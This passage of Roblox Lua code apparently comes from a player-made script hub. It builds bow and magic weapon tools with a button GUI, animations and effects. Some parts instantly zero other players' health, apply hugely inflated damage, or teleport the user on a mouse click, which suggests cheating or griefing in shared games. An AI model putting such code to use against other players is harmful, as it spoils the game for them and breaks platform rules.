						a.CFrame = handle2.CFrame
						a.CFrame = a.CFrame * CFrame.Angles(math.random(-3.2,3.2),math.random(-3.2,3.2),math.random(-3.2,3.2)) * CFrame.new(2,0,0)
						table.insert(tab, a)
					end
					wait()
					for _, v in pairs(tab) do
						v:remove()
					end
				end
				for i=1, 7 do
					wait(0.01)
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0.17,0.1,0)
				end
				coroutine.resume(coroutine.create(function()
					for i=1, 10 do
						wait(0.2)
						local h = Instance.new("Part")
						h.Parent = workspace
						h.Shape = "Ball"
						h.Size = Vector3.new(3,3,3)
						h.TopSurface = 0
						h.BottomSurface = 0
						local numb = math.random(1,4)
						h.BrickColor = BrickColor.new(cols[numb])
						h.Anchored = true
						h.CanCollide = false
						h.Transparency = 0.5
						h.CFrame = handle2.CFrame
						local function magn(hif)
							if hif.Parent.Name == player.Name then return end
							local dist = (char.Torso.Position - hif.Position).magnitude
							if dist >= 10 then
								print(dist)
								local hum = hif.Parent:findFirstChild("Humanoid")
								if hum ~= nil then
									hum.Health = 0
								end
							end
						end
						coroutine.resume(coroutine.create(function()
							for i=1, 30 do
								wait()
								magn(char.Torso)
							end
						end))
						coroutine.resume(coroutine.create(function()
							for i=1, 30 do
								wait(0.04)
								h.Size = h.Size + Vector3.new(2,2,2)
								h.Transparency = h.Transparency + 0.023
								h.CFrame = handle2.CFrame
							end
							h:remove()
						end))
					end
				end))
				for i=1, 19 do
					for i=1, 30 do
						local f = Instance.new("Part")
						f.Parent = workspace
						f.formFactor = "Symmetric"
						f.Size = Vector3.new(25,1,1)
						f.TopSurface = 0
						f.BottomSurface = 0
						local numb = math.random(1,4)
						f.BrickColor = BrickColor.new(cols[numb])
						f.Anchored = true
						f.CanCollide = false
						f.Transparency = 0.3
						local mo = Instance.new("SpecialMesh")
						mo.Parent = f
						mo.MeshType = "Brick"
						mo.Scale = Vector3.new(1,math.random(0.8,1.7),math.random(0.8,1.7))
						f.CFrame = handle2.CFrame
						f.CFrame = f.CFrame * CFrame.Angles(math.random(-3.2,3.2),math.random(-3.2,3.2),math.random(-3.2,3.2)) * CFrame.new(12.5,0,0)
						table.insert(tab, f)
					end
					wait(0.1)
					for _, v in pairs(tab) do
						v:remove()
					end
				end
				myhum.WalkSpeed = norm
				enabled = false
			end
		end) 
		mouse.KeyUp:connect(function(key) 
			key = key:lower() 
			if (key == "k") then 
				hol = false
				for i=1, 6 do
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(-0.1,-0.1,0)
					wait()
				end
				wa.C1 = original
				enabled = false
				wait(0.3)
				wa.C1 = original
			elseif (key == "e") then
				hol = false
				for i=1, 6 do
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(-0.1,-0.02,0)
					weld.C1 = weld.C1 * CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,0,0.24)
					wait()
				end
				myhum.WalkSpeed = norm
				for i=1, 5 do
					wait(0.15)
					wa.C1 = original
					weld.C1 = weporigin
				end
				enabled = false
			end
		end)
		mouse.Button1Down:connect(function()
			e = char.Torso
			wait(0.2)
			e.CFrame = CFrame.new(mouse.Hit.p) * CFrame.new(0,2.5,0)
		end)
	end 

	function deselect() 
		spin = false
		for i = 1, 8 do
			wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(-0.35,0,0)
			wait()
		end
		for i = 1, 4 do
			wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0,0.2,0)
			wait()
		end
		toha.Part0 = toha.Parent
		toha.Part1 = handle
		weld.Part0 = nil
		weld.Part1 = nil
		wait()
		wa.Part0 = nil
		wa.Part1 = nil
	end 


	script.Parent.Selected:connect(select) 
	script.Parent.Deselected:connect(deselect) 

end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "xBow"
button.Position = UDim2.new(0.5,3,0,231)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "xBow"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	me = game.Players.LocalPlayer
	char = me.Character
	Selected = false
	Able = true
	Arrow = nil
	ArrowOn = false
	Hurt = false
	Deb = true
	Reloading = false
	Shooting = false
	Slashing = false
	necko = CFrame.new(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0) 
	EffectOn = false
	Accuracy = 1
	SelAnim = false
	DMG = 123452323
	LapaCol = "Brown"
	HandCol = "Brown"
	MiddleCol = "Brown"
	ViiniCol = "Brown"
	Icon = "http://www.roblox.com/asset/?id=51902588"
	Keys = {
		e = false,
	}
	ModelName = "Epic Bow"
	CA = CFrame.Angles
	CN = CFrame.new
	MR = math.rad
	MP = math.pi
	MRA = math.random
	MH = math.huge
	UD = UDim2.new
	C3 = Color3.new
	MaximumPower = 1000000000
	MaxSpecial = 100000
	Special = MaxSpecial
	Sounds = {
		Slash = {"rbxasset://sounds//swordslash.wav", 1.2, 1},
		Shoot = {"http://www.roblox.com/asset/?id=16211041", 2, 1},
		Stick = {"http://www.roblox.com/asset/?id=2767090", 15, 1},
		Hit = {"http://www.roblox.com/asset/?id=10209590", 0.9, 1},
		Block = {"rbxasset://sounds\\metal.ogg", 1.4, 1},
	}
	function RC(Pos, Dir, Max, Ignore)
		return workspace:FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999)), Ignore)
	end
	function RayC(Start, En, MaxDist, Ignore)
		return RC(Start, (En - Start), MaxDist, Ignore)
	end
	function DetectSurface(pos, part)
		local surface = nil
		local pospos = part.CFrame
		local pos2 = pospos:pointToObjectSpace(pos)
		local siz = part.Size
		local shaep = part.Shape
		if shaep == Enum.PartType.Ball or shaep == Enum.PartType.Cylinder then
			surface = {"Anything", CN(pospos.p, pos)*CN(0, 0, -(pospos.p - pos).magnitude)*CA(MR(-90), 0, 0)}
		else
			if pos2.Y > ((siz.Y/2)-0.04) then
				surface = {"Top", CA(0, 0, 0)}
			elseif pos2.Y < -((siz.Y/2)-0.04) then
				surface = {"Bottom", CA(-MP, 0, 0)}
			elseif pos2.X > ((siz.X/2)-0.04) then
				surface = {"Right", CA(0, 0, MR(-90))}
			elseif pos2.X < -((siz.X/2)-0.04) then
				surface = {"Left", CA(0, 0, MR(90))}
			elseif pos2.Z > ((siz.Z/2)-0.04) then
				surface = {"Back", CA(MR(90), 0, 0)}
			elseif pos2.Z < -((siz.Z/2)-0.04) then
				surface = {"Front", CA(MR(-90), 0, 0)}
			end
		end
		return surface
	end
	function Compute(pos1, pos2)
		local pos3 = Vector3.new(pos2.x, pos1.y, pos2.z)
		return CN(pos1, pos3)
	end
	function Notime(func, tiem)
		if tiem then wait(tiem) end
		coroutine.resume(coroutine.create(function() func() end))
	end
	function waitChild(p, n)
		local child = p:findFirstChild(n)
		if child then return child end
		while true do
			child = p.ChildAdded:wait()
			if child.Name == n then return child end
		end
	end
	function getHumanoid(c)
		for _,v in pairs(c:children()) do
			if v:IsA("Humanoid") and c ~= char then if v.Health > 0 then return v end end
		end
	end
	function SE(part, pos)
		EffectOn = true
		local lastP = (part.CFrame * pos).p
		Notime(function()
			while EffectOn do
				wait()
				local posnow = (part.CFrame * pos).p
				local eff = Part(workspace, true, false, 0, 0, "Really black", 0.2, 1, 0.2)
				local magn = (lastP - posnow).magnitude
				local cf = CN(lastP, posnow) * CA(MR(-90), 0, 0)
				local mes2 = Instance.new("SpecialMesh",eff)
				mes2.Scale = Vector3.new(0.6, magn, 0.6)
				eff.CFrame = cf * CN(0, magn/2, 0)
				Notime(function()
					for i = 0, 1, 0.1 do
						wait()
						eff.Transparency = i
						eff.Reflectance = 0.15*i
						mes2.Scale = Vector3.new(0.6-0.6*i, magn, 0.6-0.6*i)
					end
					eff:remove()
				end)
				lastP = posnow
			end
		end)
	end
	function EE()
		EffectOn = false
	end
	torso = waitChild(char, "Torso")
	Rarm = waitChild(char, "Right Arm")
	Larm = waitChild(char, "Left Arm")
	Rleg = waitChild(char, "Right Leg")
	Lleg = waitChild(char, "Left Leg")
	Hum = waitChild(char, "Humanoid")
	neck = waitChild(torso, "Neck")
	function EditGui(obj, parent, size, position, bgcolor, bordercolor, transparency, text, textcolor, auto)
		obj.Size = size
		obj.Position = position
		obj.BackgroundColor3 = bgcolor
		obj.BorderColor3 = bordercolor
		obj.BackgroundTransparency = transparency
		if obj:IsA("TextLabel") or obj:IsA("TextButton") then
			obj.Text = text
			obj.TextColor3 = textcolor
		end
		if obj:IsA("ImageButton") or obj:IsA("TextButton") then
			obj.AutoButtonColor = auto
			obj.MouseButton1Down:connect(function()
				RemoveOptions()
			end)
		end
		obj.Parent = parent
	end
	Gui = waitChild(me, "PlayerGui")
	for _,v in pairs(Gui:children()) do
		if v.Name == "Power" then v:remove() end
	end
	Sc = Instance.new("ScreenGui", Gui)
	Sc.Name = "Power"
	Main = Instance.new("TextLabel")
	Main.Visible = false
	EditGui(Main, Sc, UD(0, 200, 0, 65), UD(0.5, -100, 0, 120), C3(0.06, 0.06, 0.1), C3(), 0.5, "Power", C3(1, 1, 0))
	Main.TextYAlignment = "Top"
	Main.FontSize = "Size36"
	Main.Font = "ArialBold"
	Main.TextTransparency = 0.5
	BarBack = Instance.new("Frame")
	EditGui(BarBack, Main, UD(1, -10, 0, 25), UD(0, 5, 1, -30), C3(0, 0, 0), C3(), 0.5)
	Bar = Instance.new("ImageLabel")
	EditGui(Bar, BarBack, UD(0, 0, 1, 0), UD(0, 0, 0, 0), C3(1, 0.7, 0), C3(), 0.5)
	Bar.Image = "http://www.roblox.com/asset/?id=48965808"
	Spec = Instance.new("Frame")
	EditGui(Spec, Sc, UD(0, 250, 0, 22), UD(0.04, 0, 0, 5), C3(1, 0.75, 0.1), C3(), 0)
	SpecialBack = Instance.new("Frame")
	EditGui(SpecialBack, Spec, UD(1, -10, 1, -6), UD(0, 5, 0, 3), C3(0.35, 0.1, 0.15), C3(), 0)
	SpecialBar = Instance.new("ImageLabel")
	EditGui(SpecialBar, SpecialBack, UD(Special/MaxSpecial, 0, 1, 0), UD(0, 0, 0, 0), C3(0.1, 0.65, 0.2), C3(), 0)
	SpecialBar.Image = "http://www.roblox.com/asset/?id=48965808"
	for i = 1, 3, 1 do
		local p = Instance.new("Frame")
		EditGui(p, SpecialBack, UD(0, 1, 1, 0), UD(i/4, 0, 0, 0), C3(0.1, 0.2, 1), C3(), 0)
		p.BorderSizePixel = 0
	end
	SpecialText = Instance.new("TextLabel")
	EditGui(SpecialText, SpecialBack, UD(1, 0, 1, 0), UD(0, 0, 0, 0), C3(), C3(), 1, "S P E C I A L", C3(1,1,1))
	SpecialText.Font = "ArialBold"
	SpecialText.FontSize = "Size14"
	function Play(Sound)
		local s = Instance.new("Sound")
		s.SoundId = Sound[1]
		s.Pitch = Sound[2]
		s.Volume = Sound[3]
		s.Parent = torso
		s.PlayOnRemove = true
		game.Debris:AddItem(s, 0.0001)
	end
	RSH = waitChild(torso, "Right Shoulder")
	LSH = waitChild(torso, "Left Shoulder")
	RH = waitChild(torso, "Right Hip")
	LH = waitChild(torso, "Left Hip")
	for i,v in pairs(char:children()) do if v.Name == ModelName then v:remove() end end
	function Part(P, Anch, Coll, Tran, Ref, Col, X, Y, Z)
		local p = Instance.new("Part")
		p.TopSurface = 0
		p.BottomSurface = 0
		p.Transparency = Tran
		p.Reflectance = Ref
		p.CanCollide = Coll
		p.Anchored = Anch
		p.BrickColor = BrickColor.new(Col)
		p.formFactor = "Custom"
		p.Size = Vector3.new(X,Y,Z)
		p.Parent = P
		p.Locked = true
		p:BreakJoints()
		return p
	end
	function Weld(P0, P1, X, Y, Z, A, B, C)
		local w = Instance.new("Weld")
		w.Part0 = P0
		w.Part1 = P1
		w.C1 = CN(X, Y, Z) * CA(A, B, C)
		w.Parent = P0
		return w
	end
	Mo = Instance.new("Model")
	Mo.Name = ModelName
	FTorso = Part(Mo, false, false, 1, 0, torso.BrickColor.Name, torso.Size.X, torso.Size.Y, torso.Size.Z)
	FWeld = Weld(torso, FTorso, 0, 0, 0, 0, 0, 0)
	RABrick = Part(Mo, false, false, 1, 0, "Really black", 0.1, 0.1, 0.1)
	LABrick = Part(Mo, false, false, 1, 0, "Really black", 0.1, 0.1, 0.1)
	RLBrick = Part(Mo, false, false, 1, 0, "Really black", 0.1, 0.1, 0.1)
	LLBrick = Part(Mo, false, false, 1, 0, "Really black", 0.1, 0.1, 0.1)
	RABW = Weld(torso, RABrick, -1.5, -0.5, 0, 0, 0, 0)
	LABW = Weld(torso, LABrick, 1.5, -0.5, 0, 0, 0, 0)
	RLBW = Weld(torso, RLBrick, -0.5, 1.2, 0, 0, 0, 0)
	LLBW = Weld(torso, LLBrick, 0.5, 1.2, 0, 0, 0, 0)
	function Atch(p)
		RABW.Part0 = p
		LABW.Part0 = p
		RLBW.Part0 = p
		LLBW.Part0 = p
		RSH.Part0 = p
		LSH.Part0 = p
		RH.Part0 = p
		LH.Part0 = p
	end
	RAW = Weld(RABrick, nil, 0, 0.5, 0, 0, 0, 0)
	LAW = Weld(LABrick, nil, 0, 0.5, 0, 0, 0, 0)
	RLW = Weld(RLBrick, nil, 0, 0.8, 0, 0, 0, 0)
	LLW = Weld(LLBrick, nil, 0, 0.8, 0, 0, 0, 0)
	HB = Part(Mo, false, false, 1, 0, "Really black", 0.1, 0.1, 0.1)
	HBW = Weld(Larm, HB, 0, 1, 0, 0, 0, 0)
	HW = Weld(HB, nil, 0, 0, 0, MR(90), 0, 0)
	AB = Part(Mo, false, false, 1, 0, "Really black", 0.1, 0.1, 0.1)
	ABW = Weld(Rarm, AB, 0, 1, 0, 0, 0, 0)
	AW = Weld(AB, nil, 0, 0, 0, 0, 0, 0)
	TW = Weld(torso, nil, -0.7, 0, 0.5, 0, MP, 0)
	Handle = Part(Mo, false, false, 0, 0, HandCol, 0.6, 1.2, 0.6)
	Instance.new("SpecialMesh",Handle)
	TW.Part1 = Handle
	for i = -0.6, 0.61, 1.2 do
		local p = Part(Mo, false, false, 0, 0, MiddleCol, 0.7, 0.2, 1.1)
		Weld(Handle, p, 0, i, 0.15, 0, 0, 0)
		Instance.new("BlockMesh", p)
	end
	local UpPoint, DownPoint
	for i = -10, 95, 15 do
		local p = Part(Mo, false, false, 0, 0, LapaCol, 0.69, 0.4, 0.2)
		local w = Weld(Handle, p, 0, 0, 1.4, 0, 0, 0)
		w.C0 = CN(0, 1.1, 0.75) * CA(MR(i), 0, 0)
		Instance.new("BlockMesh", p)
		UpPoint = p
	end
	for i = 10, -95, -15 do
		local p = Part(Mo, false, false, 0, 0, LapaCol, 0.69, 0.4, 0.2)
		local w = Weld(Handle, p, 0, 0, 1.4, 0, 0, 0)
		w.C0 = CN(0, -1.1, 0.75) * CA(MR(i), 0, 0)
		Instance.new("BlockMesh", p)
		DownPoint = p
	end
	StringUp = Part(Mo, false, false, 0, 0, "Really black", 0.2, 1, 0.2)
	StringDown = Part(Mo, false, false, 0, 0, "Really black", 0.2, 1, 0.2)
	SUM = Instance.new("SpecialMesh", StringUp)
	SDM = Instance.new("SpecialMesh", StringDown)
	SUM.Scale = Vector3.new(0.4, 2.4, 0.4)
	SDM.Scale = Vector3.new(0.4, 2.4, 0.4)
	ORSU = CN(0, -1.3, 0) * CA(MR(-85), 0, 0)
	ORSD = CN(0, 1.3, 0) * CA(MR(85), 0, 0)
	SUW = Weld(UpPoint, StringUp, 0, -1.3, 0, MR(-85), 0, 0)
	SDW = Weld(DownPoint, StringDown, 0, 1.3, 0, MR(85), 0, 0)
	SUW.C0 = CN(0, 0.15, 0)
	SDW.C0 = CN(0, -0.15, 0)
	SUW.C1 = ORSU
	SDW.C1 = ORSD
	Arrow = Part(Mo, false, false, 1, 0, "Really black", 0.4, 0.4, 4.4)
	local mesh = Instance.new("SpecialMesh",Arrow)
	mesh.MeshId = "http://www.roblox.com/asset/?id=15887356"
	mesh.TextureId = "http://www.roblox.com/asset/?id=15886781"
	mesh.Scale = Vector3.new(1, 1, 2.1)
	AW.Part1 = Arrow
	Ring = Part(Mo, false, false, 0, 0, ViiniCol, 0.2, 0.2, 0.2)
	RingM = Instance.new("SpecialMesh", Ring)
	RingM.MeshId = "http://www.roblox.com/asset/?id=3270017"
	RingM.Scale = Vector3.new(0.6, 1, 21)
	local www = Weld(FTorso, Ring, -0.9, -0.2, -0.8, MR(90), MR(90), MR(30))
	www.C0 = CA(MR(-10), 0, 0)
	Sp = Part(Mo, false, false, 0, 0, "Really black", 1, 0.2, 1)
	local S = Instance.new("SpecialMesh",Sp)
	S.MeshType = "Sphere"
	S.Scale = Vector3.new(0.65, 1, 1.05)
	Weld(Ring, Sp, 0, 1.7, 0, MR(-90), 0, 0)
	function makeArrow(pos, ang)
		local arrow = Part(Mo, false, false, 0, 0, "Really black", 0.2, 1, 0.2)
		local mesh = Instance.new("SpecialMesh",arrow)
		mesh.MeshId = "http://www.roblox.com/asset/?id=15887356"
		mesh.TextureId = "http://www.roblox.com/asset/?id=15886781"
		mesh.Scale = Vector3.new(1, 1, 2.1)
		Weld(Ring, arrow, pos.x, pos.y, pos.z, MP, 0, ang)
	end
	makeArrow(Vector3.new(0.15, 0.1, 0.55), 0.8)
	makeArrow(Vector3.new(-0.2, -0.1, 0.65), -0.4)
	makeArrow(Vector3.new(-0.1, 0.1, 0.6), 1.8)
	makeArrow(Vector3.new(-0.1, -0.15, 0.7), 1.2)
	makeArrow(Vector3.new(0, 0.3, 0.6), 0.28)
	makeArrow(Vector3.new(0, 0, 0.65), 0.34)
	makeArrow(Vector3.new(0.3, 0.1, 0.55), 1.9)
	makeArrow(Vector3.new(-0.35, 0.1, 0.67), 1.9)
	Mo.Parent = char
	function Normal()
		FTorso.Transparency = 1
		FWeld.C0 = CN()
		torso.Transparency = 0
		LAW.C0 = CA(0, 0, MR(30))
		RAW.Part1 = nil
		RAW.C0 = CN()
		RAW.C1 = CN(0, 0.5, 0)
		LAW.C1 = CN(0, 0.5, 0)
		LAW.Part1 = Larm
		RABW.Part0 = torso
		LABW.Part0 = torso
		RLBW.Part0 = torso
		LLBW.Part0 = torso
		RSH.Part0 = torso
		LSH.Part0 = torso
		RH.Part0 = torso
		LH.Part0 = torso
		AW.C0 = CN()
		HW.C0 = CA(MR(180), 0, MR(150))
		SUW.C0 = CN(0, 0.15, 0)
		SDW.C0 = CN(0, -0.15, 0)
		SUW.C1 = ORSU
		SDW.C1 = ORSD
		SUM.Scale = Vector3.new(0.4, 2.4, 0.4)
		SDM.Scale = Vector3.new(0.4, 2.4, 0.4)
	end

	bin = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
	function ShowDmg(pos, dmg)
		local col = "Bright red"
		if dmg < 1 then
			col = "Bright blue"
		end
		local m = Instance.new("Model")
		m.Name = "Damage Dealt: "..dmg*1758384
		local p = Part(m, false, false, 0, 0, col, 0.8, 0.3, 0.8)
		p.Name = "Head"
		p.CFrame = CFrame.new(pos)
		local bp = Instance.new("BodyPosition", p)
		bp.position = pos + Vector3.new(0, 2.5, 0)
		bp.P = 6500
		bp.maxForce = Vector3.new(MH, MH, MH)
		local h = Instance.new("Humanoid",m)
		h.MaxHealth = 0
		h.Health = 0
		h.Name = "fffsaf"
		m.Parent = workspace
		game.Debris:AddItem(m, 1.5)
	end
	function Dmg(hum, dmg, pos)
		if hum.Health > 0 then
			hum.Health = hum.Health - dmg*1758384
			ShowDmg(pos, dmg)
		end
	end
	function ArrowT(hit)
		local h = getHumanoid(hit.Parent)
		if h and Deb and Hurt then
			Deb = false
			Dmg(h, MRA(3,15), Arrow.CFrame * CN(0, 0, 2.2).p)
		end
	end
	Arrow.Touched:connect(ArrowT)
	function SelectAnim()
		LAW.Part1 = Larm
		SelAnim = true
		for i = 0.2, 1, 0.2 do
			LAW.C0 = CA(MR(-25*i), 0, MR(25*i)) * CN(0, 0.2*i, 0)
			wait()
		end
		HW.C0 = CN(0.4, 0.3, 0) * CA(MR(110), MR(-100), MR(180))
		HW.Part1 = Handle
		TW.Part1 = nil
		for i = 0.08, 1, 0.08 do
			LAW.C0 = CA(MR(-25+25*i), 0, MR(25-55*i)) * CN(0, 0.2-0.2*i, 0)
			HW.C0 = CN(0.4-0.4*i, 0.3-0.3*i, 0) * CA(MR(110+70*i), MR(-20+20*i), MR(180-30*i))
			wait()
		end
		SelAnim = false
		HW.C0 = CA(MR(180), 0, MR(150))
	end
	function DeselectAnim()
		for i = 0.12, 1, 0.12 do
			LAW.C0 = CA(MR(-25*i), 0, MR(-30+55*i)) * CN(0, 0.2*i, 0)
			HW.C0 = CN(0.4*i, 0.3*i, 0) * CA(MR(180-70*i), MR(-20*i), MR(150+30*i))
			if SelAnim or Selected then return end
			wait()
		end
		HW.Part1 = nil
		TW.Part1 = Handle
		for i = 0.12, 1, 0.12 do
			LAW.C0 = CA(MR(-25+25*i), 0, MR(-30+55-25*i)) * CN(0, 0.2-0.2*i, 0)
			if SelAnim or Selected then return end
			wait()
		end
		if Selected == false and SelAnim == false then
			LAW.Part1 = nil
		end
	end
	function Slash()
		RAW.Part1 = Rarm
		Slashing = true
		Play(Sounds.Slash)
		for i = 0.15, 1, 0.15 do
			RAW.C0 = CA(MR(180*i), MR(-20*i), MR(35*i))
			AW.C0 = CA(MR(35*i), 0, 0) * CN(0, 0, 0.7*i)
			wait()
		end
		for i = 0.33, 1, 0.33 do
			RAW.C0 = CA(MR(180+10*i), MR(-20), MR(35+2*i))
			AW.C0 = CA(MR(35+5*i), 0, 0) * CN(0, 0, 0.7+0.2*i)
			wait()
		end
		local blockk = false
		local hit, pos = RayC(torso.Position, torso.CFrame * CN(0, 0, -5).p, 3.2, char)
		if hit ~= nil then
			if getHumanoid(hit.Parent) == nil and hit.CanCollide == true then
				blockk = true
			end
		end
		SE(Arrow, CN(0, 0, 2.2))
		if blockk == false then
			Hurt = true
			Deb = true
			for i = 0.2, 1, 0.2 do
				RAW.C0 = CA(MR(190-140*i), MR(-20-5*i), MR(37-87*i)) * CN(0, -1*i, 0)
				AW.C0 = CA(MR(40-25*i), MR(-20*i), 0) * CN(0, 0, 0.9+0.3*i)
				wait()
			end
			EE()
			Hurt = false
			for i = 0.33, 1, 0.33 do
				RAW.C0 = CA(MR(50-10*i), MR(-25), MR(-50-5*i)) * CN(0, -1, 0)
				AW.C0 = CA(MR(15-20*i), MR(-20-1*i), 0) * CN(0, 0, 1.2*i)
				wait()
			end
			for i = 0.25, 1, 0.25 do
				RAW.C0 = CA(MR(40-10*i), MR(-25+25*i), MR(-55+35*i)) * CN(0, -1+1*i, 0)
				AW.C0 = CA(MR(-5+55*i), MR(-21+21*i), 0) * CN(0, 0, 1.2-1.2*i)
				wait()
			end
			for i = 0.25, 1, 0.25 do
				RAW.C0 = CA(MR(30-30*i), 0, MR(-20+20*i))
				AW.C0 = CA(MR(50-50*i), 0, 0)
				wait()
			end
		else
			for i = 0.5, 1, 0.5 do
				RAW.C0 = CA(MR(190-50*i), MR(-20-5*i), MR(37-27*i)) * CN(0, -0.2*i, 0)
				AW.C0 = CA(MR(40-5*i), MR(-5*i), 0) * CN(0, 0, 0.9+0.1*i)
				wait()
			end
			Play(Sounds.Block)
			for i = 0.25, 1, 0.25 do
				RAW.C0 = CA(MR(140+60*i), MR(-25+25*i), MR(10+20*i)) * CN(0, -0.2-0.3*i, 0)
				AW.C0 = CA(MR(35+45*i), MR(-5+5*i), 0) * CN(0, 0, 1)
				wait()
			end
			EE()
			for i = 0.33, 1, 0.33 do
				RAW.C0 = CA(MR(200+10*i), MR(5*i), MR(30+5*i)) * CN(0, -0.5, 0)
				AW.C0 = CA(MR(80+5*i), 0, 0) * CN(0, 0, 1)
				wait()
			end
			for i = 0.18, 1, 0.18 do
				RAW.C0 = CA(MR(210-200*i), MR(5-5*i), MR(35-30*i)) * CN(0, -0.5+0.4*i, 0)
				AW.C0 = CA(MR(85-75*i), 0, 0) * CN(0, 0, 1-0.8*i)
				wait()
			end
			for i = 0.33, 1, 0.33 do
				RAW.C0 = CA(MR(10-10*i), 0, MR(5-5*i)) * CN(0, -0.1+0.1*i, 0)
				AW.C0 = CA(MR(10-10*i), 0, 0) * CN(0, 0, 0.2-0.2*i)
				wait()
			end
			AW.C0 = CN()
		end
		Slashing = false
		RAW.Part1 = nil
	end
	function Reload()
		if ArrowOn == false then
			RAW.Part1 = Rarm
			Reloading = true
			for i = 0.16, 1, 0.16 do
				RAW.C0 = CA(MR(200*i), MR(-5*i), 0) * CN(0, -0.35*i, 0)
				wait()
			end
			AW.C0 = CA(0, MR(-90), 0)
			AW.C1 = CN(0, 0, -1.5) * CA(MR(60), 0, 0)
			Arrow.Transparency = 0
			ArrowOn = true
			for i = 0.2, 1, 0.2 do
				RAW.C0 = CA(MR(200), MR(-5), MR(40*i)) * CN(0, -0.35, 0)
				AW.C1 = CN(0, 0, -1.5+2*i) * CA(MR(60-20*i), 0, 0)
				wait()
			end
			for i = 0.33, 1, 0.33 do
				RAW.C0 = CA(MR(200), MR(-5), MR(40+10*i)) * CN(0, -0.35+0.05*i, 0)
				AW.C1 = CN(0, 0, 0.5+0.1*i) * CA(MR(40-5*i), 0, 0)
				wait()
			end
			for i = 0.18, 1, 0.18 do
				RAW.C0 = CA(MR(200-190*i), MR(-5+5*i), MR(50-45*i)) * CN(0, -0.3+0.25*i, 0)
				AW.C1 = CN(0, 0, 0.6-0.5*i) * CA(MR(35-30*i), 0, 0)
				AW.C0 = CA(0, MR(-90+80*i), 0)
				wait()
			end
			for i = 0.33, 1, 0.33 do
				RAW.C0 = CA(MR(10-10*i), 0, MR(5-5*i)) * CN(0, -0.05+0.05*i, 0)
				AW.C1 = CN(0, 0, 0.1-0.1*i) * CA(MR(5-5*i), 0, 0)
				AW.C0 = CA(0, MR(-10+10*i), 0)
				wait()
			end
			AW.C1 = CN()
			AW.C0 = CN()
			RAW.C0 = CN()
			RAW.Part1 = nil
			Reloading = false
		else
			Slash()
		end
	end
	function AddDetail(Surface, pos, bool, part, hu)
		local caf = CN(pos) * CA(part.CFrame:toEulerAnglesXYZ()) * Surface[2]
		if Surface[1] == "Anything" then
			caf = Surface[2]
		end
		Notime(function()
			if bool then
				Notime(function()
					for i = 1, MRA(2,7) do
						local x = MRA(0.4*100, 0.9*100)/100
						local z = MRA(0.7*100, 1.2*100)/100
						local pp = Part(hu.Parent, false, false, 0, 0, "Bright red", 0.2, 0.2, 0.2)
						local ms = Instance.new("SpecialMesh",pp)
						ms.MeshType = "Sphere"
						ms.Scale = Vector3.new(x*5, 1, z*5)
						pp.CFrame = caf
						local w = Weld(part, pp, 0, 0, 0, 0, 0, 0)
						local c0 = part.CFrame:toObjectSpace(caf) * CN(MRA(-0.3*100, 0.3*100)/100, 0, MRA(-0.3*100, 0.3*100)/100) * CA(0, MR(MRA(-180,180)), 0)
						w.C0 = c0
						Notime(function()
							local moar = MRA(-1.1*1000, 1.1*1000)/1000
							for i = 0, 1, MRA(0.02*1000, 0.06*1000)/1000 do
								wait()
								w.C0 = c0 * CN(0, 0, -moar*i)
								ms.Scale = Vector3.new((x*5)-(moar/3)*i, 1, (z*5)+(moar/3)*i)
								pp.Transparency = -0.5+1.5*i
							end
							pp:remove()
						end)
					end
				end)
				for i = 1, MRA(4,8) do
					Notime(function()
						local pp2 = Part(hu.Parent, true, false, 0, 0, "Bright red", 0.2, 0.2, 0.2)
						pp2.CFrame = caf
						local ms2 = Instance.new("SpecialMesh",pp2)
						ms2.MeshType = "Sphere"
						ms2.Scale = Vector3.new(1.5, 1.5, 1.5)
						local face = CA(MR(MRA(-40, 40)+105), MR(MRA(-40, 40)), MR(MRA(-40, 40)))
						local center = caf * face * CN(0, -5, 0)
						Notime(function()
							for i = 0, 1, 0.1 do
								pp2.Transparency = -0.7+1.7*i
								pp2.CFrame = center * CN(0, 0, -2.5*i) * CA(MR(-55*i), 0, 0) * CN(0, 5, 0)
								wait()
							end
							pp2:remove()
						end)
					end)
				end
			else
				Notime(function()
					for i = 1, MRA(5,8) do
						Notime(function()
							local t = {"Bright yellow", "New Yeller", "Really black", "Institutional Really black", "Brick yellow"}
							local pp = Part(workspace, true, false, 0, 0, t[MRA(1, #t)], 0.2, 0.2, 0.2)
							local mes = Instance.new("SpecialMesh",pp)
							mes.MeshType = "Sphere"
							mes.Scale = Vector3.new(0.5, 0.5, 1)
							local caa = CN(caf.p) * CA(MR(MRA(-180,180)), MR(MRA(-180,180)), MR(MRA(-180,180)))
							pp.CFrame = caa
							for i = 0.25, 1, 0.25 do
								wait()
								mes.Scale = Vector3.new(0.5+0.1*i, 0.5+0.1*i, 1+2*i)
								pp.CFrame = caa * CN(0, 0, -0.4*i)
							end
							for i = 0.25, 1, 0.25 do
								wait()
								mes.Scale = Vector3.new(0.6, 0.6, 3+1.6*i)
								pp.CFrame = caa * CN(0, 0, -0.6-0.32*i)
								pp.Transparency = -0.2+1.2*i
							end
							pp:remove()
						end)
					end
				end)
			end
		end)
	end
	function ShootArrow(pos, power, targ)
		local Start = Handle.Position
		local mag = (Start - pos).magnitude/200
		if mag > 12.5 then mag = 12.5 end
		if targ == nil then mag = 1 end
		local Face = CN(Start, pos) * CA(MR(MRA(-Accuracy*10000, Accuracy*10000)/10000+mag), MR(MRA(-Accuracy*10000, Accuracy*10000)/10000), MR(MRA(-Accuracy*10000, Accuracy*10000)/10000))
		local Arr = Part(Mo, true, false, 0, 0, "Really black", 0.2, 0.2, 0.2)
		local mes = Instance.new("SpecialMesh",Arr)
		mes.MeshId = "http://www.roblox.com/asset/?id=15887356"
		mes.TextureId = "http://www.roblox.com/asset/?id=15886781"
		mes.Scale = Vector3.new(1, 1, 2.1)
